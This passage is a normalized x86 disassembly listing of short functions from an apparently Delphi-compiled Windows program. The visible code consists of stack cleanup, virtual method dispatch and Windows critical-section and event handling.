mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41482c
call sub_40eee0
retn
sub_414834
mov ecx 0xe
call sub_413ed0
cmp al 0x1
retn
sub_4148b3
jmp sub_403ae4
sub_4148ba
pop ebp
retn
sub_41495d
jmp sub_403ae4
sub_414964
pop ebp
retn
sub_414a8d
jmp sub_403ae4
sub_414a94
pop ebp
retn
sub_414a98
sub [ rw-data ] 0x1
retn
sub_414b96
jmp sub_403ae4
sub_414b9d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414ebc
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414e24
mov eax ebx
mov edx esp
call sub_4043c8
add esp 0x100
pop ebx
retn
sub_414f18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_4041b8
pop esi
pop ebx
retn
j_sub_403ae4
jmp sub_403ae4
sub_414ffb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41504c
jmp sub_403ae4
sub_415053
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4151a0
jmp sub_403ae4
sub_4151a7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415276
jmp sub_403ae4
sub_41527d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f4a0
pop esi
pop ebx
retn
sub_41583e
jmp sub_403ae4
sub_415845
pop ebp
retn
sub_415848
sub [ rw-data ] 0x1
retn
sub_415875
jmp sub_403ae4
sub_41587c
pop ebp
retn
sub_415880
sub [ rw-data ] 0x1
retn
sub_41618d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4190c8
sub_416a35
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_417254
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_417378
mov eax [ eax + 0xc ]
call sub_418744
retn
sub_41764f
jmp sub_403ae4
sub_417656
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41765c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4188fc
test eax eax
setge al
pop esi
pop ebx
retn
sub_41795f
jmp sub_403ae4
sub_417966
mov esp ebp
pop ebp
retn
sub_417a34
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417a40
push ebx
mov ebx edx
mov edx ebx
call sub_417854
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4175b4
sub_417aec
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417c47
jmp sub_403ae4
sub_417d1b
jmp sub_403ae4
sub_417d2c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417d98
jmp sub_403ae4
sub_417d9f
pop ebx
mov esp ebp
pop ebp
retn
sub_417dea
jmp sub_403ae4
sub_417df1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
j_sub_403ae4#4
jmp sub_403ae4
sub_417e84
pop ebx
pop ebp
retn
sub_417eca
jmp sub_403ae4
sub_417ed1
pop ebx
pop ebp
retn
sub_417f16
jmp sub_403ae4
sub_417f1d
pop ebx
pop ebp
retn
sub_417f67
jmp sub_403ae4
sub_417f6e
pop esi
pop ebx
pop ebp
retn
sub_417fc2
jmp sub_403ae4
sub_417fc9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4180f6
jmp sub_403ae4
sub_418172
jmp sub_403ae4
sub_418248
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418a3c
sub_418338
jmp sub_403ae4
sub_4184c2
jmp sub_403ae4
sub_4184c9
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418563
jmp sub_403ae4
sub_41856a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418589
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418582
jmp sub_403ae4
sub_418589
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4185f5
jmp sub_403ae4
sub_4185fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4186f4
jmp sub_403ae4
sub_4186fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_418711
jmp sub_403ae4
sub_418778
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418a98
xor edx edx
mov eax ebx
call sub_418a5c
pop ebx
retn
sub_4187f0
mov eax [ ebp + 0x4 ]
retn
sub_418826
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418874
jmp sub_403ae4
sub_41887b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418880
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_418898
xor edx edx
call sub_4188a0
retn
sub_418988
mov edx [ eax + 0x8 ]
dec edx
call sub_4188a0
retn
sub_418b08
retn
sub_418bc2
jmp sub_403ae4
sub_418bc9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403704
sub_418c58
jmp sub_403ae4
sub_418c5f
pop ebx
pop ecx
pop ebp
retn
sub_418c64
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_418cbb
jmp sub_403ae4
sub_418cc2
pop ebx
pop ecx
pop ebp
retn
sub_418cc8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418d04
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
retn
sub_418d1c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418df7
retn
sub_418eb4
test edx edx
je r-xdata
xor edx edx
call sub_418ec8
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418f7e
jmp sub_403ae4
sub_418f85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418f98
xchg edx eax
call sub_418ec8
retn
sub_418fa0
retn
sub_419039
jmp sub_403ae4
sub_419040
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4191fd
jmp sub_403ae4
sub_419204
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419298
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_4188fc
retn
sub_41936d
jmp sub_403ae4
sub_419374
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4193b8
xor edx edx
call sub_419274
retn
sub_419526
jmp sub_403ae4
sub_419540
inc [ eax + 0xc ]
retn
sub_419544
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4195ae
jmp sub_403ae4
sub_4195bc
dec [ eax + 0xc ]
call sub_419544
retn
sub_4195f8
xor eax eax
retn
sub_4195fc
push ebx
mov ebx ecx
mov eax ebx
call sub_404164
pop ebx
retn
sub_419630
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4188a0
pop esi
pop ebx
retn
sub_4196f2
jmp sub_403ae4
sub_4196f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419809
jmp sub_403ae4
sub_4198e4
retn
sub_4198e8
retn
sub_4198ec
retn
sub_4198f0
retn
sub_41995c
mov eax [ eax + 0x18 ]
retn
sub_419a62
jmp sub_403ae4
sub_419a69
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a86
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_419a7f
jmp sub_403ae4
sub_419a86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419b10
jmp sub_403ae4
sub_419b28
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419be4
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419c8d
jmp sub_403ae4
sub_419c94
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419ca0
mov eax [ ebp + 0x4 ]
retn
sub_419cd6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419d24
jmp sub_403ae4
sub_419d2b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419dea
jmp sub_403ae4
sub_419df1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e13
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
sub_419e0c
jmp sub_403ae4
sub_419e13
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e1c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419e24
xor eax eax
retn
sub_419e6d
jmp sub_403ae4
sub_419e74
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419f87
jmp sub_403ae4
sub_419f8e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a01c
jmp sub_403ae4
sub_41a023
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a0f3
jmp sub_403ae4
sub_41a0fa
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403ae4#6
jmp sub_403ae4
sub_41a1b7
pop esi
pop ecx
pop ebp
retn
sub_41a23c
jmp sub_403ae4
sub_41a243
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a260
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_41a259
jmp sub_403ae4
sub_41a260
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a2ec
jmp sub_403ae4
sub_41a309
jmp sub_403ae4
sub_41a310
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a34c
retn
sub_41a3cf
jmp sub_403ae4
sub_41a3d6
mov eax [ ebp - 0x8 ]
call sub_41cf10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3fb
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_41a3f4
jmp sub_403ae4
sub_41a3fb
mov esp ebp
pop ebp
retn
sub_41a44b
jmp sub_403ae4
sub_41a452
pop esi
pop ecx
pop ebp
retn
sub_41a4a5
jmp sub_403ae4
sub_41a4ac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a4b4
retn
sub_41a52f
jmp sub_403ae4
sub_41a536
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a5d3
jmp sub_403ae4
sub_41a5da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5f7
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_41a5f0
jmp sub_403ae4
sub_41a5f7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a5fc
retn
sub_41a676
jmp sub_403ae4
sub_41a67d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a684
mov eax edx
mov edx ecx
call sub_4081e0
retn
sub_41a690
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a6a8
sub_41a720
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a790
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a7ac
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a9a0
mov eax [ eax + 0x18 ]
retn
sub_41a9a4
mov eax [ eax + 0x14 ]
retn
sub_41aa40
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41ac4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40272c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41ac88
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41aca0
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41acb4
mov edx sub_41aca0
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41acfc
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_4081e0
retn
mov eax edx
mov edx ecx
call sub_4081a8
retn
sub_41ad98
retn
sub_41b090
jmp sub_403ae4
sub_41b097
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b0f8
jmp sub_403ae4
sub_41b0ff
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b144
mov eax [ eax + 0x4 ]
call sub_408758
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b154
mov eax [ eax + 0x4 ]
call sub_408784
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b190
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41b339
jmp sub_403ae4
sub_41b398
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b428
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b478
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b663
jmp sub_403ae4
sub_41b66a
mov esp ebp
pop ebp
retn
sub_41b714
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
retn
sub_41b79c
mov [ eax + 0x18 ] edx
retn
sub_41b918
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414dc8
retn
sub_41b99f
jmp sub_403ae4
sub_41b9a6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ba52
jmp sub_403ae4
sub_41ba59
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bbfd
jmp sub_403ae4
sub_41bc4f
jmp sub_403ae4
sub_41bc6e
jmp sub_403ae4
sub_41bc75
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc94
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41bc8d
jmp sub_403ae4
sub_41bc94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bd37
jmp sub_403ae4
sub_41bdbf
jmp sub_403ae4
sub_41bdcc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
pop ebx
retn
sub_41bde4
mov eax [ rw-data ]
call sub_41bdcc
retn
sub_41be1c
push ebx
call sub_414bfc
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41bde4
sub_41bf89
jmp sub_403ae4
sub_41bf90
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404164
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41c0b0
jmp sub_403ae4
sub_41c0b7
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c1ae
jmp sub_403ae4
sub_41c1cb
jmp sub_403ae4
sub_41c1d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c2d0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41ad18
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c394
push ebx
mov ebx eax
mov eax ebx
call sub_41dd48
cmp al 0x9
sete al
pop ebx
retn
sub_41c3f3
jmp sub_403ae4
sub_41c3fa
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c4a0
jmp sub_403ae4
sub_41c4a7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c4c0
jmp [ eax + 0x70 ]
sub_41c726
jmp sub_403830
sub_41c752
jmp sub_403830
sub_41c7f4
jmp sub_403830
sub_41c897
jmp sub_403830
sub_41ca6f
jmp sub_403830
sub_41cab1
jmp sub_403ae4
sub_41cae1
jmp sub_403ae4
sub_41cae8
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cb57
jmp sub_403ae4
sub_41cc2e
jmp sub_403ae4
sub_41cc35
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cf08
mov dl 0x1
call sub_41be70
retn
sub_41d049
jmp sub_403ae4
sub_41d050
pop ebx
mov esp ebp
pop ebp
retn
sub_41d058
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41de58
mov eax [ rw-data ]
call sub_41bdcc
pop ebp
retn
j_sub_40395c#9
jmp sub_40395c
sub_41d1d7
add [ eax ] eax
add [ eax ] al
int3
j_sub_40395c#7
jmp sub_40395c
sub_41d1fe
add [ eax ] eax
add [ eax ] al
int3
sub_41d244
jmp sub_403ae4
sub_41d24b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d32b
jmp sub_403ae4
sub_41d332
mov esp ebp
pop ebp
retn
sub_41d3ea
jmp sub_403ae4
sub_41d3f1
pop ecx
pop ecx
pop ebp
retn
sub_41d6f3
jmp sub_403ae4
sub_41d6fa
pop ebx
mov esp ebp
pop ebp
retn
sub_41d99f
jmp sub_403ae4
sub_41d9a6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403368
retn
sub_41d9bf
jmp sub_403ae4
sub_41d9e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403830
sub_41da1a
jmp sub_403830
sub_41da59
jmp sub_403ae4
sub_41da60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da82
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404188
retn
sub_41da7b
jmp sub_403ae4
sub_41da82
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41db09
jmp sub_403830
sub_41db36
jmp sub_403ae4
sub_41db3d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41db48
push ecx
mov edx esp
mov ecx 0x4
call sub_41c30c
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41bdcc
sub_41dc55
jmp sub_403ae4
sub_41dc5c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41dd3b
jmp sub_403ae4
sub_41dd42
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dd98
jmp sub_403ae4
sub_41dd9f
pop ebx
pop ecx
pop ebp
retn
sub_41dfe7
jmp sub_403ae4
sub_41dfee
pop ecx
pop ecx
pop ebp
retn
sub_41e031
jmp sub_403ae4
sub_41e038
pop ebx
pop ecx
pop ebp
retn
sub_41e0d4
jmp sub_403ae4
sub_41e0db
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e189
jmp sub_403ae4
sub_41e190
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e19c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e3f7
jmp sub_403ae4
sub_41e3fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e423
mov eax [ ebp - 0x8 ]
call sub_403368
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_41e41c
jmp sub_403ae4
sub_41e423
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e448
lea eax [ ebp - 0x1c ]
call sub_405b04
lea eax [ ebp - 0x18 ]
call sub_404164
retn
sub_41e441
jmp sub_403ae4
sub_41e448
pop ebx
mov esp ebp
pop ebp
retn
sub_41e65a
jmp sub_403ae4
sub_41e661
pop ebx
mov esp ebp
pop ebp
retn
sub_41e694
mov eax [ eax + 0x30 ]
call sub_418744
retn
sub_41e704
call sub_41e834
retn
sub_41e748
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b79c
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e823
jmp sub_403ae4
sub_41e82a
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e834
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41af7c
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e84c
test dl dl
je r-xdata
mov dl 0x8
call sub_420980
retn
mov dl 0x9
call sub_420980
retn
sub_41e8a3
jmp sub_403ae4
sub_41e8aa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e942
jmp sub_403ae4
sub_41e949
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41eae7
jmp sub_403ae4
sub_41eaee
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ee2f
jmp sub_403ae4
sub_41ee71
jmp sub_403ae4
sub_41eed0
jmp sub_403ae4
sub_41eed7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f114
mov dl 0x1
call sub_420980
retn
sub_41f11c
xor edx edx
call sub_420980
retn
sub_41f215
jmp sub_403ae4
sub_41f3eb
jmp sub_403ae4
sub_41f3f2
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f5c0
jmp sub_403ae4
sub_41f5c7
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f69d
jmp sub_403ae4
sub_41f6a4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f7bb
jmp sub_403ae4
sub_41f7c2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f97c
jmp sub_403ae4
sub_41f983
pop ecx
pop ebp
retn
sub_41fa0e
jmp sub_403ae4
sub_41fa15
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fa7c
jmp sub_403ae4
sub_41fa83
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fb01
jmp sub_403ae4
sub_41fb08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb25
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_41fb1e
jmp sub_403ae4
sub_41fb25
pop ebx
pop ecx
pop ebp
retn
sub_41fbe0
jmp sub_403ae4
sub_41fbe7
pop ebx
pop ecx
pop ebp
retn
sub_41fcbd
jmp sub_403ae4
sub_41fcc4
pop ecx
pop ebp
retn
sub_41fcc8
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41fdcf
jmp sub_403ae4
sub_41fdd6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ff7d
jmp sub_403ae4
sub_41fffc
jmp sub_403ae4
sub_420003
mov esp ebp
pop ebp
retn
sub_4200d1
jmp sub_403ae4
sub_4200d8
pop ebx
mov esp ebp
pop ebp
retn
sub_42018b
jmp sub_403ae4
sub_420192
pop ebx
mov esp ebp
pop ebp
retn
sub_4201f1
jmp sub_403ae4
sub_4201f8
mov esp ebp
pop ebp
retn
sub_42065d
jmp sub_403ae4
sub_4206b7
jmp sub_403ae4
sub_4206c8
jmp sub_403830
sub_420724
jmp sub_403ae4
sub_42072b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42078a
jmp sub_403ae4
sub_420791
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4208bd
jmp sub_403ae4
sub_4208c4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420972
jmp sub_403ae4
sub_420979
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4209b8
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cf34
sub_4209ec
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_420a04
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420a10
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_420a04
sub_420a2c
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_420a38
push rw-data
call InterlockedIncrement
retn
sub_420a44
push rw-data
call InterlockedDecrement
retn
sub_420b5a
jmp sub_403830
sub_420b89
jmp sub_403ae4
sub_420bbf
jmp sub_403ae4
sub_420bc6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420be5
push rw-data
call LeaveCriticalSection
retn
sub_420bde
jmp sub_403ae4
sub_420be5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c31
jmp sub_403830
sub_420d42
jmp sub_403ae4
sub_420d49
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_420dd0
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_4210b0
sub_420e4a
jmp sub_403ae4
sub_420e51
pop ebx
mov esp ebp
pop ebp
retn
sub_420e70
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_420e84
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_420e70
call sub_421004
sub_420fa9
jmp sub_403ae4
sub_420fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420fcf
push rw-data
call LeaveCriticalSection
retn
sub_420fc8
jmp sub_403ae4
sub_420fcf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_420fe6
jmp sub_403ae4
sub_42102c
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_4210b0
call sub_421044
jmp r-xdata
sub_421091
jmp sub_403830
sub_4210d8
mov [ eax + 0xd ] 0x1
retn
sub_421248
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_421424
sub_4212a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41ce58
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_4212bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41ce58
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4212d0
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f048
retn
sub_4212dc
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f048
retn
sub_421584
xor eax eax
retn
sub_421588
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421590
xor eax eax
retn
sub_421594
retn
sub_421598
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4041b8
pop esi
pop ebx
retn
sub_4215ac
mov eax [ eax + 0x4 ]
retn
sub_4215b0
retn
sub_4215b4
xor eax eax
retn
sub_4215b8
retn
sub_4215bc
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_4215c8
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_4215d4
push ebx
mov ebx eax
